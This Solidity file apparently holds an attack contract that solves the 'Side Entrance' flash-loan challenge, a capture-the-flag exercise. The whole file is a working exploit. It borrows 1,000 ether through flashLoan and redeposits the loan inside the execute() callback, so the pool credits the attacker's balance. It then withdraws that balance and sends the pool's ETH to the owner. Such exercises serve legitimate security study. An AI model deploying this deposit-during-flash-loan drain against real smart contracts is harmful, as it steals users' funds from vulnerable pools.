// SPDX-License-Identifier: MIT
import "solady/src/utils/SafeTransferLib.sol";

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideAttack {
    address private _owner;
    address private _pool;

    constructor(address pool) {
        _owner = msg.sender;
        _pool = pool;
    }

    function execute() external payable {
        require(msg.sender == _pool, "UNAUTHORIZED A");
        // Deposit funds into the pool, crediting this account for entire deposit amount.
        ISideEntranceLenderPool(_pool).deposit{value: msg.value}();
    }

    function attack() external {
        require(msg.sender == _owner, "UNAUTHORIZED B");
        ISideEntranceLenderPool(_pool).flashLoan(1_000 ether);
        ISideEntranceLenderPool(_pool).withdraw();
        SafeTransferLib.safeTransferETH(_owner, address(this).balance);
    }

    receive() external payable {}
}
